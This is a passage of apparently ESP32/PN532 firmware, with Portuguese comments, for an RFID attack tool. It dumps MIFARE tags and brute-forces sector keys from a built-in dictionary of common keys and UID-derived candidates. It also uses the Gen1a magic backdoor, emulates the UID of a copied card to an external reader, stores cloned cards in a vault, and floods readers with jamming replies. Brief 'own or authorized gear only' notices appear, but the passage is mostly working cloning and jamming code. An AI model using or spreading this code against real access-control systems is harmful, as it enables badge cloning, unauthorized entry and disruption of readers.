        if (nz) {
          blocksWithData++;
        }
        Serial.printf("P%u:", (unsigned)page);
        for (int i = 0; i < 4; i++) {
          Serial.printf(" %02X", pg[i]);
        }
        Serial.println();
      } else if (rfidDumpTagLost(uid, uidLength, (unsigned)page)) {
        return;
      }
      delay(18);
    }
  } else {
    rfidRestoreBus();
    rfidResultAndDismiss("Dump", "Unsupported",
                         "Dump targets Classic or Ultralight/NTAG.\nTag did not match.");
    return;
  }

  const bool tagGoneAtEnd = segmentsExpected > 0 && blocksRead > 0 && blocksRead < segmentsExpected &&
                            !rfidTagStillPresent(uid, uidLength);

  rfidRestoreBus();

  if (blocksRead == 0) {
    rfidResultAndDismiss("Dump", "Read failed", "No blocks/pages could be read.\nCheck tag position and keys.");
    return;
  }

  if (tagGoneAtEnd) {
    char body[160];
    snprintf(body, sizeof(body),
             "UID: %s\nType: %s\n\nOnly %d of %d blocks read before tag left the field.",
             uidStr, cardTypeStr(ct), blocksRead, segmentsExpected);
    rfidResultAndDismiss("Dump", "Tag lost", body);
    return;
  }

  char body[420];
  const bool partial = segmentsExpected > 0 && blocksRead < segmentsExpected;
  snprintf(body, sizeof(body),
           "UID: %s\nType: %s\n\n"
           "Segments read OK: %d%s\nBlocks/pages with any non-zero byte: %d\n\n"
           "%sOpen Serial Monitor for full hex.",
           uidStr, cardTypeStr(ct), blocksRead,
           partial ? " (partial — some blocks need other keys)" : "",
           blocksWithData, partial ? "Some blocks were skipped (auth/key).\n" : "");
  rfidResultAndDismiss("Dump", "Done", body);
}

void sessionDecodeAccess() {
  static const char kIntro[] =
      "Reads MIFARE Classic sector 1 trailer (block 7) and shows raw access bytes.\n"
      "Uses default keys A/B.\n\n"
      "Present a Classic tag on the coil.";

  rfidAttachBus();
  uint8_t uid[7] = {0};
  uint8_t uidLength = 0;
  if (!rfidListenIso14443a("Decode Access", "Cancel", uid, &uidLength,
                           (unsigned long)RFID_TAG_LISTEN_TIMEOUT_MS, "Classic tag", kIntro)) {
    rfidRestoreBus();
    return;
  }

  char uidStr[24] = "";
  uidToHex(uidStr, sizeof(uidStr), uid, uidLength);
  rfidSetDynamicPill("OK", UI_OK);
  rfidSetBandAux(nullptr);
  rfidDynamicBand(0, "Tag detected", uidStr);
  rfidPrint(String("[+] Tag detected ") + uidStr, UI_OK, false);

  CardType ct = detectCardType(uid, uidLength);
  if (ct != MIFARE_CLASSIC) {
    rfidRestoreBus();
    rfidPresentResult("Decode Access", "Skipped", "Only MIFARE Classic sector trailers.");
    return;
  }

  uint8_t keyA[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t keyB[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t blk[16] = {0};
  bool authenticated = false;
  (void)tryMagicBackdoor();
  if (s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 7, 0, keyA)) {
    authenticated = true;
  } else if (s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 7, 1, keyB)) {
    authenticated = true;
  }

  if (!authenticated || !s_nfc.mifareclassic_ReadDataBlock(7, blk)) {
    rfidRestoreBus();
    rfidResultAndDismiss("Decode Access", "Failed", "Could not read block 7 (sector 1 trailer).");
    return;
  }

  uint8_t a6 = blk[6], a7 = blk[7], a8 = blk[8];
  uint8_t c1 = (uint8_t)((a7 >> 5) & 0x01);
  uint8_t c2 = (uint8_t)((a8 >> 1) & 0x01);
  uint8_t c3 = (uint8_t)((a8 >> 5) & 0x01);
  uint8_t accessCond = (uint8_t)((c1 << 2) | (c2 << 1) | c3);

  rfidRestoreBus();

  char body[420];
  snprintf(body, sizeof(body),
           "UID %s\nSector 1 trailer (block 7):\n"
           "%02X %02X %02X %02X %02X %02X %02X %02X\n"
           "%02X %02X %02X %02X %02X %02X %02X %02X\n\n"
           "Access bytes [6..8]: %02X %02X %02X\n"
           "Condition bits C1..C3 (nibble-style): %u %u %u → code %u\n\n"
           "(Interpret with MFC access-bit tables for your sector.)",
           uidStr, blk[0], blk[1], blk[2], blk[3], blk[4], blk[5], blk[6], blk[7], blk[8], blk[9],
           blk[10], blk[11], blk[12], blk[13], blk[14], blk[15], a6, a7, a8, (unsigned)c1,
           (unsigned)c2, (unsigned)c3, (unsigned)accessCond);
  rfidResultAndDismiss("Decode Access", "Block 7", body);
}

void sessionJamReader() {
  static const char kIntro[] =
      "Puts the PN532 into ISO14443A target mode and sends rapid replies toward "
      "an external reader.\n\nKeep antennas close to the reader coil.\n\n"
      "Stop ends the session.";

  rfidAttachBus();
  rfidShellProgress("Jam Reader", "Preparing target mode...", "Stop", kIntro);

  uint8_t rx[64];
  uint8_t rxLen = sizeof(rx);
  if (!rfidTargetWaitReader("Waiting for reader", RFID_TARGET_WAIT_TIMEOUT_MS, rx, &rxLen, true)) {
    rfidRestoreBus();
    return;
  }

  rfidSetDynamicPill("JAM", UI_WARN);
  rfidSetBandAux(nullptr);
  rfidDynamicBand(0, "Jam active", "Flooding external reader");
  rfidPrint("[+] Reader detected", UI_OK, false);

  static const uint8_t kJamResp[] = {0xFF, 0xFF, 0xFF, 0xFF};
  unsigned long lastUiMs = 0;
  bool pendingRx = true;

  for (;;) {
    if (rfidPumpSessionUi()) {
      break;
    }
    if (rfidPollCancel()) {
      break;
    }

    if (pendingRx) {
      if (!rfidTargetSendResponse(kJamResp, sizeof(kJamResp))) {
        rfidDynamicBand(0, "Jam active", "Waiting for reader...");
        pendingRx = rfidTargetWaitReader("Waiting for reader", 0, rx, &rxLen, false);
        if (!pendingRx) {
          break;
        }
        rfidPrint("[+] Reader reconnected", UI_OK, false);
        continue;
      }
      pendingRx = false;
    }

    rxLen = sizeof(rx);
    if (s_nfc.getDataTarget(rx, &rxLen)) {
      pendingRx = true;
      const unsigned long now = millis();
      if (now - lastUiMs >= 200) {
        rfidDynamicBand(0, "Jam active", "Reader RF collision / flood");
        lastUiMs = now;
      }
    } else {
      const unsigned long now = millis();
      if (now - lastUiMs >= 200) {
        rfidDynamicBand(0, "Jam active", "Waiting for reader...");
        lastUiMs = now;
      }
      pendingRx = rfidTargetWaitReader("Waiting for reader", 0, rx, &rxLen, false);
      if (!pendingRx) {
        break;
      }
      rfidPrint("[+] Reader reconnected", UI_OK, false);
    }
    delay(5);
  }

  s_nfc.SAMConfig();
  s_nfc.setPassiveActivationRetries(0xFF);
  rfidRestoreBus();
  if (rfidSessionExitRequested()) {
    return;
  }
  rfidResultAndDismiss("Jam Reader", "Stopped", "SAM reconfigured; reader mode restored.");
}

void sessionDisruptEmulate() {
  static const char kIntro[] =
      "Target mode: cycles payloads (FF / 00 / random) on each exchange.\n"
      "Use only on gear you own or are permitted to test.\n\n"
      "Stop ends the session.";

  rfidAttachBus();
  rfidShellProgress("Disrupt Emulate", "Preparing target mode...", "Stop", kIntro);

  uint8_t rx[64];
  uint8_t rxLen = sizeof(rx);
  if (!rfidTargetWaitReader("Waiting for reader", RFID_TARGET_WAIT_TIMEOUT_MS, rx, &rxLen, true)) {
    rfidRestoreBus();
    return;
  }

  rfidSetDynamicPill("TX", UI_WARN);
  rfidSetBandAux(nullptr);
  rfidDynamicBand(0, "Disrupt active", "FF / 00 / random payloads");
  rfidPrint("[+] Reader detected", UI_OK, false);

  uint8_t txPayload[16];
  uint8_t cycle = 0;
  unsigned long lastUiMs = 0;
  bool pendingRx = true;

  for (;;) {
    if (rfidPumpSessionUi()) {
      break;
    }
    if (rfidPollCancel()) {
      break;
    }

    if (pendingRx) {
      if (cycle % 3 == 0) {
        memset(txPayload, 0xFF, sizeof(txPayload));
      } else if (cycle % 3 == 1) {
        memset(txPayload, 0x00, sizeof(txPayload));
      } else {
        for (unsigned i = 0; i < sizeof(txPayload); i++) {
          txPayload[i] = (uint8_t)(random(256));
        }
      }
      cycle++;

      if (!rfidTargetSendResponse(txPayload, sizeof(txPayload))) {
        rfidDynamicBand(0, "Disrupt active", "Waiting for reader...");
        pendingRx = rfidTargetWaitReader("Waiting for reader", 0, rx, &rxLen, false);
        if (!pendingRx) {
          break;
        }
        rfidPrint("[+] Reader reconnected", UI_OK, false);
        continue;
      }
      pendingRx = false;
    }

    rxLen = sizeof(rx);
    if (s_nfc.getDataTarget(rx, &rxLen)) {
      pendingRx = true;
      const unsigned long now = millis();
      if (now - lastUiMs >= 200) {
        rfidDynamicBand(0, "Disrupt active", "FF / 00 / random payloads");
        lastUiMs = now;
      }
    } else {
      const unsigned long now = millis();
      if (now - lastUiMs >= 200) {
        rfidDynamicBand(0, "Disrupt active", "Waiting for reader...");
        lastUiMs = now;
      }
      pendingRx = rfidTargetWaitReader("Waiting for reader", 0, rx, &rxLen, false);
      if (!pendingRx) {
        break;
      }
      rfidPrint("[+] Reader reconnected", UI_OK, false);
    }
    delay(5);
  }

  s_nfc.SAMConfig();
  s_nfc.setPassiveActivationRetries(0xFF);
  rfidRestoreBus();
  if (rfidSessionExitRequested()) {
    return;
  }
  rfidResultAndDismiss("Disrupt Emulate", "Stopped", "SAM reconfigured.");
}

/**
 * Emula o UID de um cartao real (modo target). Le um cartao, guarda o UID e
 * faz o PN532 responder como ele. Para leitores que so leem o UID.
 */
void sessionEmulate() {
  static const char kIntro[] =
      "Target mode: emula o UID de um cartao real.\n"
      "Use apenas em equipamento proprio ou autorizado.\n\n"
      "1) apresente o cartao a copiar;\n"
      "2) encoste o DIV no leitor externo;\n"
      "3) o DIV responde com o UID lido.\n\n"
      "Stop encerra a sessao.";

  rfidAttachBus();
  rfidShellProgress("Emular", "Aguardando cartao...", "Cancel", kIntro);

  uint8_t uid[7] = {0};
  uint8_t uidLength = 0;
  if (!rfidListenIso14443a("Emular", "Cancelar", uid, &uidLength,
                           (unsigned long)RFID_CLONE_PHASE_TIMEOUT_MS,
                           "Apresente o cartao a copiar", kIntro)) {
    rfidRestoreBus();
    return;
  }

  char uidStr[24] = "";
  uidToHex(uidStr, sizeof(uidStr), uid, uidLength);
  rfidSetDynamicPill("OK", UI_OK);
  rfidDynamicBand(0, "Cartao lido", uidStr);
  rfidPrint(String("[+] Cartao ") + uidStr, UI_OK, false);

  s_nfc.setTargetUid(uid, uidLength);

  rfidShellProgress("Emular", "Aguardando leitor externo...", "Parar",
                    "Encoste o DIV no leitor. O UID emulado e o do cartao lido.");

  uint8_t rx[64];
  uint8_t rxLen = sizeof(rx);
  if (!rfidTargetWaitReader("Aguardando leitor", RFID_TARGET_WAIT_TIMEOUT_MS, rx,
                            &rxLen, true)) {
    rfidRestoreBus();
    return;
  }

  rfidSetDynamicPill("TX", UI_WARN);
  rfidDynamicBand(0, "Emulando", uidStr);
  rfidPrint("[+] Leitor detectado - emulando", UI_OK, false);

  for (;;) {
    if (rfidPumpSessionUi()) {
      break;
    }
    if (rfidPollCancel()) {
      break;
    }
    rxLen = sizeof(rx);
    if (s_nfc.getDataTarget(rx, &rxLen)) {
      // Reenvia o UID como resposta (o PN532 cuida da anticolisao/SELECT).
      rfidTargetSendResponse(uid, uidLength);
    }
    delay(5);
  }

  s_nfc.SAMConfig();
  s_nfc.setPassiveActivationRetries(0xFF);
  rfidRestoreBus();
  if (rfidSessionExitRequested()) {
    return;
  }
  rfidResultAndDismiss("Emular", "Parado", "Sessao encerrada.");
}

// ===================== Clone Card 2 (cofre de cartoes) =====================

struct VaultCard {
  char name[16];
  uint8_t uid[7];
  uint8_t uidLen;
  uint8_t secKey[16][6];    // chave que abriu cada setor
  uint8_t secSlot[16];      // 0=nada, 1=key A, 2=key B, 3=magic (sem chave)
  uint8_t data[16][4][16];  // 64 blocos x 16 bytes
  uint8_t dumpOk;           // 1 = dump completo lido
};

static constexpr int kMaxVaultCards = 8;
static VaultCard s_vault[kMaxVaultCards];
static int s_vaultCount = 0;
static int s_vaultSel = 0;

/** Insertion sort by name (case-insensitive) so the list is always alphabetical. */
static void vaultSort() {
  for (int i = 1; i < s_vaultCount; i++) {
    VaultCard key = s_vault[i];
    int j = i - 1;
    while (j >= 0 && strcasecmp(s_vault[j].name, key.name) > 0) {
      s_vault[j + 1] = s_vault[j];
      --j;
    }
    s_vault[j + 1] = key;
  }
}

static int vaultFindByName(const char* name) {
  if (!name) return -1;
  for (int i = 0; i < s_vaultCount; i++) {
    if (strcasecmp(s_vault[i].name, name) == 0) return i;
  }
  return -1;
}

static void vaultLoad() {
  Preferences p;
  if (!p.begin("rfid_vault", true)) {
    s_vaultCount = 0;
    s_vaultSel = 0;
    return;
  }
  s_vaultCount = p.getInt("count", 0);
  if (s_vaultCount < 0) s_vaultCount = 0;
  if (s_vaultCount > kMaxVaultCards) s_vaultCount = kMaxVaultCards;
  if (s_vaultCount > 0 && p.getBytesLength("cards") == (size_t)sizeof(s_vault)) {
    p.getBytes("cards", s_vault, sizeof(s_vault));
  } else {
    s_vaultCount = 0;
  }
  vaultSort();
  s_vaultSel = 0;
  p.end();
}

static void vaultSave() {
  Preferences p;
  if (!p.begin("rfid_vault", false)) return;
  p.putInt("count", s_vaultCount);
  p.putBytes("cards", s_vault, sizeof(s_vault));
  p.end();
}

/** True if `name` is already used by another saved card (case-insensitive). */
static bool vaultNameInUse(const char* name, int excludeIdx) {
  if (!name || !name[0]) return true;
  for (int i = 0; i < s_vaultCount; i++) {
    if (i == excludeIdx) continue;
    if (strcasecmp(s_vault[i].name, name) == 0) return true;
  }
  return false;
}

static void vaultSetNavMain() {
  setTouchNavLabels(t(STR_NAV_BACK), nullptr, t(STR_NAV_READ), nullptr, t(STR_NAV_LIST));
}

static void vaultSetNavList() {
  setTouchNavLabels(t(STR_NAV_BACK), t(STR_NAV_NEXT), t(STR_NAV_SEL), t(STR_NAV_PREV),
                    t(STR_NAV_VIEW));
}

static void vaultDrawMain() {
  rfidShellProgress("Clone Card 2", "Pronto", nullptr,
                    "SELECIONAR: ler cartao. DIREITO: lista. ESQUERDO: sair.");
  char buf[40];
  snprintf(buf, sizeof(buf), "Cartoes: %d", s_vaultCount);
  rfidDynamicBand(0, "Clone Card 2", buf);
  rfidPrint("[*] SELECIONAR: ler cartao", UI_TEXT, false);
  rfidPrint("[*] DIREITO: lista", UI_TEXT, false);
  if (s_vaultCount > 0) {
    rfidPrint(String("[+] Selecionado: ") + s_vault[s_vaultSel].name, UI_OK, false);
  }
  vaultSetNavMain();
  rfidRedrawNavChrome();
}

static void vaultDrawList() {
  rfidShellProgress("Clone Card 2", "Cartoes", nullptr,
                    "CIMA/BAIXO: navegar. SELECIONAR: emular. DIREITO: ver. ESQUERDO: voltar.");
  char buf[40];
  snprintf(buf, sizeof(buf), "%d cartoes", s_vaultCount);
  rfidDynamicBand(0, "Lista de cartoes", buf);
  rfidListenShellReset();
  if (s_vaultCount == 0) {
    rfidPrint("Nenhum cartao. Leia um primeiro.", UI_DIM_TEXT, false);
  } else {
    for (int i = 0; i < s_vaultCount; i++) {
      char line[40];
      snprintf(line, sizeof(line), "%s%s", (i == s_vaultSel) ? "> " : "  ", s_vault[i].name);
      rfidPrint(line, (i == s_vaultSel) ? UI_OK : UI_TEXT, false);
    }
  }
  vaultSetNavList();
  rfidRedrawNavChrome();
}

static void vaultSetNavView() {
  setTouchNavLabels(t(STR_NAV_BACK), t(STR_NAV_DELETE), nullptr, t(STR_NAV_RENAME), nullptr);
}

static void vaultDrawView() {
  VaultCard& c = s_vault[s_vaultSel];
  int keyed = 0;
  for (int i = 0; i < 16; i++) {
    if (c.secSlot[i]) keyed++;
  }
  rfidShellProgress("Clone Card 2", "Detalhes", nullptr,
                    "CIMA: renomear. BAIXO: deletar. ESQUERDO: voltar.");
  rfidDynamicBand(0, c.name, "ISO14443A");
  char uidStr[24] = "";
  uidToHex(uidStr, sizeof(uidStr), c.uid, c.uidLen);
  rfidPrint(String("[+] UID: ") + uidStr, UI_OK, false);
  char keyLine[40];
  snprintf(keyLine, sizeof(keyLine), "[%s] Setores com chave: %d/16",
           (keyed == 16) ? "+" : "!", keyed);
  rfidPrint(keyLine, (keyed == 16) ? UI_OK : UI_WARN, false);
  rfidPrint("[*] CIMA: renomear", UI_TEXT, false);
  vaultSetNavView();
  rfidRedrawNavChrome();
}

static void vaultRename() {
  if (s_vaultSel < 0 || s_vaultSel >= s_vaultCount) return;
  OnScreenKeyboardConfig cfg;
  cfg.titleLine1 = "[!] Renomear cartao";
  cfg.titleLine2 = "(max 15 chars, nomes unicos)";
  osKeyboardUseStandardLayout(cfg);
  cfg.maxLen = 15;
  cfg.buttonsY = 195;
  cfg.backLabel = "Back";
  cfg.okLabel = "OK";
  cfg.enableShuffle = false;
  cfg.requireNonEmpty = true;
  cfg.emptyErrorMsg = "Nome vazio!";
  for (;;) {
    setTouchButtonInputEnabled(false);
    OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, String(s_vault[s_vaultSel].name));
    setTouchButtonInputEnabled(true);
    if (!r.accepted || r.text.length() == 0) return;
    if (vaultNameInUse(r.text.c_str(), s_vaultSel)) {
      rfidResultAndDismiss("Clone Card 2", "Nome em uso",
                           "Ja existe outro cartao com esse nome.\nEscolha outro.");
      continue;
    }
    memset(s_vault[s_vaultSel].name, 0, sizeof(s_vault[s_vaultSel].name));
    strncpy(s_vault[s_vaultSel].name, r.text.c_str(), sizeof(s_vault[s_vaultSel].name) - 1);
    vaultSort();
    {
      const int idx = vaultFindByName(r.text.c_str());
      if (idx >= 0) s_vaultSel = idx;
    }
    vaultSave();
    return;
  }
}

static void vaultDelete() {
  if (s_vaultSel < 0 || s_vaultSel >= s_vaultCount) return;
  for (int i = s_vaultSel; i < s_vaultCount - 1; i++) {
    s_vault[i] = s_vault[i + 1];
  }
  s_vaultCount--;
  if (s_vaultCount > 0) {
    if (s_vaultSel >= s_vaultCount) s_vaultSel = s_vaultCount - 1;
  } else {
    s_vaultSel = 0;
  }
  if (s_vaultCount < kMaxVaultCards) {
    memset(&s_vault[s_vaultCount], 0, sizeof(VaultCard));
  }
  vaultSave();
}

// ---------------- Dicionario de chaves Mifare Classic ----------------
// As chaves mais usadas no mercado + variantes. Nao existe "todas as chaves"
// (sao 2^48); isto cobre o que e conhecido/publico.
static const uint8_t kMfcKeys[][6] = {
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5}, {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7},
    {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD}, {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A},
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}, {0x71, 0x4C, 0x5C, 0x88, 0x6E, 0x97},
    {0x58, 0x7C, 0xE5, 0xF1, 0x8E, 0x0F}, {0x7A, 0x2E, 0x3C, 0x8D, 0x4B, 0x5F},
    {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC}, {0x01, 0x02, 0x03, 0x04, 0x05, 0x06},
    {0x11, 0x22, 0x33, 0x44, 0x55, 0x66}, {0x22, 0x22, 0x22, 0x22, 0x22, 0x22},
    {0x33, 0x33, 0x33, 0x33, 0x33, 0x33}, {0x44, 0x44, 0x44, 0x44, 0x44, 0x44},
    {0x55, 0x55, 0x55, 0x55, 0x55, 0x55}, {0x66, 0x66, 0x66, 0x66, 0x66, 0x66},
    {0x77, 0x77, 0x77, 0x77, 0x77, 0x77}, {0x88, 0x88, 0x88, 0x88, 0x88, 0x88},
    {0x99, 0x99, 0x99, 0x99, 0x99, 0x99}, {0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA},
    {0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB}, {0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC},
    {0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD}, {0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE},
    {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5}, {0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5},
    {0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5}, {0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5},
    {0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5}, {0xF0, 0xE1, 0xD2, 0xC3, 0xB4, 0xA5},
    {0xA5, 0xB4, 0xC3, 0xD2, 0xE1, 0xF0}, {0x12, 0x34, 0x56, 0x78, 0x90, 0xAB},
    {0x00, 0x11, 0x22, 0x33, 0x44, 0x55}, {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB},
    {0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56}, {0x48, 0x45, 0x4C, 0x4C, 0x4F, 0x21},
    {0x4D, 0x49, 0x46, 0x41, 0x52, 0x45}, {0x4D, 0x46, 0x43, 0x4C, 0x54, 0x52},
    {0x00, 0x00, 0x00, 0x00, 0x00, 0xFF}, {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00},
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x01}, {0x00, 0x00, 0x00, 0x00, 0x00, 0x0A},
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE}, {0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF},
    {0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00}, {0x1A, 0x2B, 0x3C, 0x4D, 0x5E, 0x6F},
    {0x2C, 0x7E, 0x45, 0x9A, 0x1A, 0x98}, {0x4A, 0x3B, 0x2C, 0x1D, 0x0E, 0x0F},
    {0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F}, {0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F},
    {0xDE, 0xAD, 0xBE, 0xEF, 0x12, 0x34}, {0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x01},
    {0x0F, 0x1E, 0x2D, 0x3C, 0x4B, 0x5A}, {0xA1, 0xB2, 0xC3, 0xD4, 0xE5, 0xF6},
};

static constexpr int kMfcKeyCount = (int)(sizeof(kMfcKeys) / sizeof(kMfcKeys[0]));

/** Chaves candidatas derivadas do UID (padroes usados por fabricantes). */
static int mfcUidCandidates(const uint8_t* uid, uint8_t uidLen, uint8_t out[][6], int maxOut) {
  uint8_t cand[16][6];
  int n = 0;
  if (uidLen >= 6) {
    memcpy(cand[n++], uid, 6);                        // primeiros 6
    memcpy(cand[n++], uid + (uidLen - 6), 6);         // ultimos 6
    for (int i = 0; i < 6; i++) cand[n][i] = uid[uidLen - 1 - i];
    n++;                                              // invertido
  }
  if (uidLen >= 4) {
    uint8_t buf[6];
    memset(buf, 0, 6);
    memcpy(buf, uid, 4);
    memcpy(cand[n++], buf, 6);                        // u0..u3 00 00
    memcpy(buf + 4, uid, 2);
    memcpy(cand[n++], buf, 6);                        // u0..u3 u0 u1
    memset(buf + 4, 0xFF, 2);
    memcpy(cand[n++], buf, 6);                        // u0..u3 FF FF
    memset(buf + 4, 0, 2);
    memcpy(buf + 4, uid + 2, 2);
    memcpy(cand[n++], buf, 6);                        // u0..u3 u2 u3
    uint8_t bcc = 0;
    for (uint8_t i = 0; i < uidLen; i++) bcc ^= uid[i];
    memset(buf, 0, 6);
    memcpy(buf, uid, 4);
    buf[4] = bcc;
    memcpy(cand[n++], buf, 6);                        // u0..u3 bcc 00
  }
  int m = 0;
  for (int i = 0; i < n && m < maxOut; i++) {
    bool dup = false;
    for (int j = 0; j < m; j++) {
      if (memcmp(cand[j], cand[i], 6) == 0) { dup = true; break; }
    }
    if (!dup) { memcpy(out[m], cand[i], 6); m++; }
  }
  return m;
}

/** Le os 4 blocos de um setor JA autenticado (sem re-listar). Retorna 0..4. */
static int mfcReadBlocks(uint8_t s, uint8_t data[4][16]) {
  int ok = 0;
  for (uint8_t b = 0; b < 4; b++) {
    bool got = false;
    for (int r = 0; r < 3 && !got; r++) {
      if (s_nfc.mifareclassic_ReadDataBlock((uint8_t)(s * 4 + b), data[b])) {
        got = true;
      } else {
        delay(4);
      }
    }
    if (!got) break;
    ok++;
    delay(4);
  }
  return ok;
}

/** Le um setor inteiro com retentativas (auth + 4 blocos). Robustez de RF. */
static bool mfcReadSector(uint8_t* uid, uint8_t uidLen, uint8_t s, uint8_t key[6], uint8_t* slotIo,
                          uint8_t data[4][16]) {
  const uint8_t blk0 = (uint8_t)(s * 4);
  const uint8_t first = (*slotIo == 1) ? 0 : 1;
  for (int t = 0; t < 2; t++) {
    const uint8_t keyNum = (t == 0) ? first : (uint8_t)(1 - first);
    const bool authOk = s_nfc.mifareclassic_AuthenticateBlock(uid, uidLen, blk0, keyNum, key);
    if (!authOk) {
      Serial.printf("DUMP: s%u auth slot%u falhou\n", (unsigned)s, (unsigned)keyNum);
      // re-seleciona o cartao antes da proxima tentativa (padrao do mfoc)
      uint8_t u2[7] = {0};
      uint8_t ul2 = 0;
      s_nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, u2, &ul2, 60);
      continue;
    }
    Serial.printf("DUMP: s%u auth slot%u ok\n", (unsigned)s, (unsigned)keyNum);
    bool ok = true;
    for (uint8_t b = 0; b < 4; b++) {
      bool got = false;
      for (int r = 0; r < 3 && !got; r++) {
        if (s_nfc.mifareclassic_ReadDataBlock((uint8_t)(s * 4 + b), data[b])) {
          got = true;
        } else {
          delay(6);
        }
      }
      if (!got) {
        ok = false;
        break;
      }
      delay(5);
    }
    if (ok) {
      *slotIo = (keyNum == 0) ? 1 : 2;
      return true;
    }
    // leitura falhou: re-seleciona antes de tentar o outro slot
    uint8_t u2[7] = {0};
    uint8_t ul2 = 0;
    s_nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, u2, &ul2, 60);
    Serial.printf("DUMP: s%u leitura falhou no reparo -> re-selecionado\n", (unsigned)s);
  }
  return false;
}

static bool vaultRead() {
  uint8_t uid[7] = {0};
  uint8_t uidLen = 0;
  rfidAttachBus();
  if (!rfidListenIso14443a("Ler cartao", "Cancelar", uid, &uidLen,
                           (unsigned long)RFID_CLONE_PHASE_TIMEOUT_MS,
                           "Apresente o cartao", "Encoste o cartao que sera copiado.")) {
    return false;
  }
  if (s_vaultCount >= kMaxVaultCards) {
    rfidResultAndDismiss("Clone Card 2", "Cheio", "Limite de cartoes do cofre atingido.");
    return false;
  }

  // ------- 1) DUMP PRIMEIRO (o cartao ainda esta na bobina) -------
  VaultCard& c = s_vault[s_vaultCount];
  memset(&c, 0, sizeof(c));
  memcpy(c.uid, uid, uidLen);
  c.uidLen = uidLen;

  bool dumpOk = true;
  int keyed = 0;
  rfidShellProgress("Ler cartao", "Mantenha o cartao", "Cancelar", nullptr);
  rfidSetFeatureInfo("Ler cartao", "");
  rfidSetListenNavLabels("Cancelar", false);
  {
    char u[24] = "";
    uidToHex(u, sizeof(u), uid, uidLen);
    Serial.printf("DUMP: inicio UID %s (%u bytes)\n", u, (unsigned)uidLen);
  }

  for (int attempt = 0; attempt < 2; attempt++) {
    keyed = 0;
    dumpOk = true;
    memset(c.secKey, 0, sizeof(c.secKey));
    memset(c.secSlot, 0, sizeof(c.secSlot));
    memset(c.data, 0, sizeof(c.data));

    // O cartao tem de estar na bobina antes de comecar.
    bool cancelled = false;
    for (;;) {
      if (rfidPumpSessionUi() || rfidPollCancel()) {
        cancelled = true;
        break;
      }
      if (rfidTagStillPresent(uid, uidLen)) break;
      rfidDynamicBand(0, "Aproxime o cartao", "Mantenha na bobina");
      delay(200);
    }
    if (cancelled) return false;

    // 1.1) Tag "magic" Gen1a: o backdoor 0x40/0x43 libera leitura sem chave.
    const bool magic = tryMagicBackdoor();
    Serial.printf("DUMP: magic backdoor = %d\n", (int)magic);
    if (magic) {
      for (uint8_t s = 0; s < 16; s++) {
        c.secSlot[s] = 3;
        for (uint8_t b = 0; b < 4; b++) {
          if (!s_nfc.mifareclassic_ReadDataBlock((uint8_t)(s * 4 + b), c.data[s][b])) {
            dumpOk = false;
          }
          delay(2);
        }
        keyed++;
      }
      Serial.printf("DUMP: magic liberou %d setores\n", keyed);
    } else {
      // 1.2) Dicionario + candidatas do UID, slots A e B, setor a setor.
      uint8_t uidCand[16][6];
      uint16_t gotMask = 0;
      const int uidCandCount = mfcUidCandidates(uid, uidLen, uidCand, 16);
      const int totalCand = kMfcKeyCount + uidCandCount;
      int candIdx = 0;
      for (; candIdx < totalCand && keyed < 16; candIdx++) {
        if (rfidPumpSessionUi() || rfidPollCancel()) {
          dumpOk = false;
          break;
        }
        const uint8_t* k =
            (candIdx < kMfcKeyCount) ? kMfcKeys[candIdx] : uidCand[candIdx - kMfcKeyCount];
        char l1[40];
        char l2[40];
        snprintf(l1, sizeof(l1), "Chave %d/%d", candIdx + 1, totalCand);
        snprintf(l2, sizeof(l2), "Setores %d/16", keyed);
        rfidDynamicBand(0, l1, l2);
        for (uint8_t s = 0; s < 16; s++) {
          if (c.secSlot[s]) continue;
          const uint8_t blk = (uint8_t)(s * 4);
          uint8_t slot = 0;
          if (s_nfc.mifareclassic_AuthenticateBlock(uid, uidLen, blk, 0, (uint8_t*)k)) {
            slot = 1;
          } else if (s_nfc.mifareclassic_AuthenticateBlock(uid, uidLen, blk, 1, (uint8_t*)k)) {
            slot = 2;
          }
          if (!slot) continue;
          memcpy(c.secKey[s], k, 6);
          c.secSlot[s] = slot;
          keyed++;
          // Le imediatamente: sem re-listar o cartao e sem delay antes do 1o bloco.
          const int nread = mfcReadBlocks(s, c.data[s]);
          if (nread == 4) {
            gotMask |= (uint16_t)(1u << s);
          } else {
            // Leitura falhou (NAK): re-seleciona o cartao, como o mfoc faz apos
            // qualquer erro, para nao envenenar as autenticacoes seguintes.
            uint8_t u2[7] = {0};
            uint8_t ul2 = 0;
